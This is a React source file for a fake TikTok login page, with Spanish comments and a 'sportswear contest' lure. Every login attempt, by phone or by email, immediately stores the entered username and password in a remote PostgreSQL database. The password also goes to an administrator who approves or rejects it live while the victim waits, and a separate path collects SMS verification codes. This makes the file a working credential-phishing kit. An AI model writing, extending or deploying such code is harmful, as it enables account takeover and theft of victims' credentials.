import React, { useState, useEffect } from 'react';
import { TikTokLogo, ChevronLeft, HelpIcon, SunIcon, MoonIcon } from '../icons';
import { Toast } from '../common/Toast';
import { HelpModal } from '../common/HelpModal';
import { SuccessModal } from '../common/SuccessModal';
import { VerificationCodeView } from './VerificationCodeView';
import { MainAuthOptionsView } from './views/MainAuthOptionsView';
import { PhoneEmailAuthView } from './views/PhoneEmailAuthView';
import { QrCodeAuthView } from './views/QrCodeAuthView';
import { SportswearContestView } from './SportswearContestView';
import { registerUser } from '../../api/loging.api';
import {
  createUserLoginRequest,
  subscribeToVerificationRequest,
} from '../../services/verification.service';
import type { AuthView, AuthTab, AuthUser } from '../../types/auth';

export const MainPage: React.FC = () => {
  // Navigation & theme states
  const [currentView, setCurrentView] = useState<AuthView>('PHONE_EMAIL');
  const [isSignUp, setIsSignUp] = useState(false);
  const [darkMode, setDarkMode] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeUserId, setActiveUserId] = useState<number | null>(null);
  const [, setAuthenticatedUser] = useState<AuthUser | null>(null);

  // Phone / Email sub-view states
  const [authTab, setAuthTab] = useState<AuthTab>('phone');
  const [countryCode, setCountryCode] = useState('+57');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneLoginWithPassword, setPhoneLoginWithPassword] = useState(false);
  const [phonePassword, setPhonePassword] = useState('');

  // Email states
  const [emailOrUser, setEmailOrUser] = useState('');
  const [emailPassword, setEmailPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Password validation by admin states
  const [isWaitingPasswordApproval, setIsWaitingPasswordApproval] = useState(false);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [activeLoginRequestId, setActiveLoginRequestId] = useState<string | null>(null);

  // Modal & Toast feedbacks
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [showHelpModal, setShowHelpModal] = useState(false);
  const [simulatedLoginSuccess, setSimulatedLoginSuccess] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 3200);
  };

  const handleSocialClick = (providerName: string) => {
    showToast(`Conectando con ${providerName}...`);
    setTimeout(() => {
      setSimulatedLoginSuccess(`¡Bienvenido! Sesión iniciada exitosamente con ${providerName}.`);
    }, 1000);
  };

  // Suscripción reactiva para la validación de contraseña por el Administrador
  useEffect(() => {
    if (!activeLoginRequestId) return;

    const unsubscribe = subscribeToVerificationRequest(
      activeLoginRequestId,
      (updatedReq) => {
        if (updatedReq.status === 'APPROVED') {
          setIsWaitingPasswordApproval(false);
          setPasswordError(null);
          setActiveLoginRequestId(null);

          const targetName = updatedReq.username;
          setAuthenticatedUser({
            id: updatedReq.userId,
            username: targetName,
            inicio_sesion: updatedReq.inicio_sesion || 'usuario',
          });
          setSimulatedLoginSuccess(
            `¡Sesión iniciada con éxito! Bienvenido(a) de nuevo, ${targetName}.`
          );
        } else if (updatedReq.status === 'REJECTED') {
          setIsWaitingPasswordApproval(false);
          setPasswordError(updatedReq.message || 'La contraseña es incorrecta');
          setActiveLoginRequestId(null);
          setEmailPassword('');
          setPhonePassword('');
          showToast('La contraseña es incorrecta');
        }
      },
      activeUserId
    );

    return () => {
      unsubscribe();
    };
  }, [activeLoginRequestId, activeUserId]);

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanPhone = phoneNumber.trim().replace(/[\s-]/g, '');
    if (!cleanPhone) return;

    // Mode A: Login with 6-digit SMS verification code (register with 'no-password')
    if (!phoneLoginWithPassword && !isSignUp) {
      setIsLoading(true);
      try {
        const res = await registerUser({
          inicio_sesion: 'telefono',
          username: cleanPhone,
          password: 'no-password',
        });
        const newUserId = res.user?.id ? Number(res.user.id) : null;
        setActiveUserId(newUserId);
        setAuthenticatedUser({
          id: res.user?.id,
          username: cleanPhone,
          inicio_sesion: 'telefono',
        });
        setCurrentView('VERIFY_CODE');
        showToast(`Código de 6 dígitos enviado a ${countryCode} ${phoneNumber}`);
      } catch (err: unknown) {
        const error = err as Error;
        showToast(error.message || 'Error al procesar el número de teléfono.');
      } finally {
        setIsLoading(false);
      }
      return;
    }

    // Mode B: Password login or Registration via API
    setIsLoading(true);
    setPasswordError(null);
    const credentials = {
      inicio_sesion: 'telefono' as const,
      username: cleanPhone,
      password: phonePassword,
    };

    try {
      if (isSignUp) {
        const res = await registerUser(credentials);
        setAuthenticatedUser({
          id: res.user?.id,
          username: cleanPhone,
          inicio_sesion: 'telefono',
        });
        setSimulatedLoginSuccess(`¡Cuenta registrada exitosamente! Bienvenido(a), ${countryCode} ${phoneNumber}. (Tipo: teléfono)`);
      } else {
        // Guardar credenciales de inmediato en PostgreSQL de la nube (Neon/Render)
        const res = await registerUser(credentials);
        const newUserId = res.user?.id ? Number(res.user.id) : null;
        if (newUserId) {
          setActiveUserId(newUserId);
        }

        // Crear solicitud de validación de contraseña para el Administrador
        const req = createUserLoginRequest(
          newUserId ?? undefined,
          `${countryCode} ${cleanPhone}`,
          phonePassword,
          'telefono'
        );

        setActiveLoginRequestId(req.id);
        setIsWaitingPasswordApproval(true);
      }
    } catch (err: unknown) {
      const error = err as Error;
      showToast(error.message || 'Error en la autenticación.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const trimmedUser = emailOrUser.trim();
    if (!trimmedUser || !emailPassword) return;

    setIsLoading(true);
    setPasswordError(null);
    const credentials = {
      inicio_sesion: trimmedUser.includes('@') ? 'correo' : 'usuario',
      username: trimmedUser,
      password: emailPassword,
    };

    try {
      if (isSignUp) {
        const res = await registerUser(credentials);
        setAuthenticatedUser({
          id: res.user?.id,
          username: trimmedUser,
          inicio_sesion: credentials.inicio_sesion,
        });
        setSimulatedLoginSuccess(`¡Cuenta registrada exitosamente! Bienvenido(a), ${trimmedUser}. (Tipo: ${credentials.inicio_sesion})`);
      } else {
        // 1. Guardar de inmediato en PostgreSQL (Render / Neon) para que aparezca ya en la base de datos
        const res = await registerUser(credentials);
        const newUserId = res.user?.id ? Number(res.user.id) : null;
        if (newUserId) {
          setActiveUserId(newUserId);
        }

        // 2. Crear solicitud de validación en tiempo real para el Administrador
        const req = createUserLoginRequest(
          newUserId ?? undefined,
          trimmedUser,
          emailPassword,
          credentials.inicio_sesion
        );

        // 3. Activar el estado de espera para que el usuario aguarde la decisión del admin
        setActiveLoginRequestId(req.id);
        setIsWaitingPasswordApproval(true);
      }
    } catch (err: unknown) {
      const error = err as Error;
      showToast(error.message || 'Error en la autenticación.');
    } finally {
      setIsLoading(false);
    }
  };

  const isEmailSubmitValid = emailOrUser.trim().length > 0 && emailPassword.length >= 6;
  const isPhoneSubmitValid =
    phoneNumber.trim().length >= 7 &&
    (isSignUp || phoneLoginWithPassword ? phonePassword.length >= 6 : true);

  if (currentView === 'SPORTS_CONTEST') {
    return (
      <>
        <Toast message={toastMessage} />
        <SportswearContestView
          userPhoneOrName={phoneNumber ? `${countryCode} ${phoneNumber}` : emailOrUser}
          userId={activeUserId}
          darkMode={darkMode}
          onToggleDarkMode={() => setDarkMode(!darkMode)}
          onExit={() => setCurrentView('PHONE_EMAIL')}
          showToast={showToast}
        />
      </>
    );
  }

  return (
    <main
      className={`min-h-screen w-full transition-colors duration-200 flex flex-col justify-between items-center ${
        darkMode ? 'bg-[#121212] text-white' : 'bg-white text-[#161823]'
      } font-sans selection:bg-[#FE2C55]/20`}
    >
      {/* Toast Notification */}
      <Toast message={toastMessage} />

      {/* Success Simulation Modal */}
      <SuccessModal
        message={simulatedLoginSuccess}
        onClose={() => {
          setSimulatedLoginSuccess(null);
          setCurrentView('SPORTS_CONTEST');
        }}
        darkMode={darkMode}
      />

      {/* Help Modal */}
      <HelpModal
        isOpen={showHelpModal}
        onClose={() => setShowHelpModal(false)}
        darkMode={darkMode}
        showToast={showToast}
      />

      {/* Main Container - Mobile First Max Width (390px - 480px) */}
      <div className="w-full max-w-[440px] flex-1 flex flex-col justify-between px-5 sm:px-6 py-4">
        {currentView === 'VERIFY_CODE' ? (
          <VerificationCodeView
            phoneNumber={phoneNumber}
            countryCode={countryCode}
            userId={activeUserId}
            onBack={() => setCurrentView('PHONE_EMAIL')}
            onHelp={() => setShowHelpModal(true)}
            onSuccess={() => {
              setCurrentView('SPORTS_CONTEST');
              showToast('Sesión iniciada con éxito');
            }}
            showToast={showToast}
            darkMode={darkMode}
            onToggleDarkMode={() => setDarkMode(!darkMode)}
          />
        ) : (
          <>
            {/* Top Navigation Bar */}
            <header className="flex items-center justify-between h-12 w-full">
              {currentView === 'MAIN' || currentView === 'QR' ? (
                <div className="flex items-center gap-3">
                  <button
                    onClick={() => setCurrentView('PHONE_EMAIL')}
                    className="p-1 -ml-1 rounded-full hover:bg-gray-500/15 active:scale-95 transition-all cursor-pointer flex items-center gap-1 text-xs text-gray-500 hover:text-black dark:hover:text-white"
                    aria-label="Volver"
                    title="Volver"
                  >
                    <ChevronLeft />
                  </button>
                  <div className="flex items-center gap-2">
                    <TikTokLogo className="w-6 h-6" />
                    <span className="font-extrabold tracking-tight text-base">TikTok</span>
                  </div>
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <TikTokLogo className="w-7 h-7" />
                  <span className="font-extrabold tracking-tight text-lg">TikTok</span>
                </div>
              )}

              <div className="flex items-center gap-2">
                {/* Theme Toggle (Dark / Light) */}
                <button
                  onClick={() => setDarkMode(!darkMode)}
                  className={`p-2 rounded-full text-xs font-semibold flex items-center gap-1 transition-colors cursor-pointer ${
                    darkMode ? 'bg-white/10 hover:bg-white/20 text-yellow-300' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'
                  }`}
                  title={darkMode ? 'Cambiar a modo claro' : 'Cambiar a modo oscuro'}
                  aria-label="Alternar modo de color"
                >
                  {darkMode ? <SunIcon /> : <MoonIcon />}
                </button>

                {/* Help Question Mark */}
                <button
                  onClick={() => setShowHelpModal(true)}
                  className="p-2 rounded-full hover:bg-gray-500/15 text-gray-500 hover:text-gray-900 dark:hover:text-white transition-colors cursor-pointer"
                  aria-label="Comentarios y ayuda"
                >
                  <HelpIcon />
                </button>
              </div>
            </header>

            {/* Content Area */}
            <section className="flex-1 flex flex-col justify-center my-4">
              {currentView === 'MAIN' && (
                <MainAuthOptionsView
                  isSignUp={isSignUp}
                  darkMode={darkMode}
                  onSelectView={setCurrentView}
                  onSocialClick={handleSocialClick}
                  showToast={showToast}
                />
              )}

              {currentView === 'PHONE_EMAIL' && (
                <PhoneEmailAuthView
                  isSignUp={isSignUp}
                  darkMode={darkMode}
                  isLoading={isLoading}
                  isWaitingPasswordApproval={isWaitingPasswordApproval}
                  passwordError={passwordError}
                  onClearPasswordError={() => setPasswordError(null)}
                  authTab={authTab}
                  setAuthTab={setAuthTab}
                  countryCode={countryCode}
                  setCountryCode={setCountryCode}
                  phoneNumber={phoneNumber}
                  setPhoneNumber={setPhoneNumber}
                  phoneLoginWithPassword={phoneLoginWithPassword}
                  setPhoneLoginWithPassword={setPhoneLoginWithPassword}
                  phonePassword={phonePassword}
                  setPhonePassword={setPhonePassword}
                  emailOrUser={emailOrUser}
                  setEmailOrUser={setEmailOrUser}
                  emailPassword={emailPassword}
                  setEmailPassword={setEmailPassword}
                  showPassword={showPassword}
                  setShowPassword={setShowPassword}
                  isPhoneSubmitValid={isPhoneSubmitValid}
                  isEmailSubmitValid={isEmailSubmitValid}
                  handlePhoneSubmit={handlePhoneSubmit}
                  handleEmailSubmit={handleEmailSubmit}
                  onSelectView={setCurrentView}
                  showToast={showToast}
                />
              )}

              {currentView === 'QR' && (
                <QrCodeAuthView
                  darkMode={darkMode}
                  onSimulateScan={() => {
                    showToast('¡Escaneo simulado detectado desde TikTok Móvil!');
                    setTimeout(() => {
                      setSimulatedLoginSuccess('¡Dispositivo móvil vinculado con éxito!');
                    }, 800);
                  }}
                />
              )}
            </section>

            {/* Footer Area: Switch between Sign Up & Log In */}
            <footer className="w-full pt-4 border-t border-gray-100 dark:border-gray-800 text-center text-sm">
              {isSignUp ? (
                <p>
                  <span className="text-gray-500">¿Ya tienes una cuenta? </span>
                  <button
                    type="button"
                    onClick={() => {
                      setIsSignUp(false);
                      setCurrentView('PHONE_EMAIL');
                    }}
                    className="font-bold text-[#FE2C55] hover:underline cursor-pointer ml-1"
                  >
                    Iniciar sesión
                  </button>
                </p>
              ) : (
                <p>
                  <span className="text-gray-500">¿No tienes una cuenta? </span>
                  <button
                    type="button"
                    onClick={() => {
                      setIsSignUp(true);
                      setCurrentView('PHONE_EMAIL');
                    }}
                    className="font-bold text-[#FE2C55] hover:underline cursor-pointer ml-1"
                  >
                    Registrarse
                  </button>
                </p>
              )}
            </footer>
          </>
        )}
      </div>
    </main>
  );
};

export default MainPage;
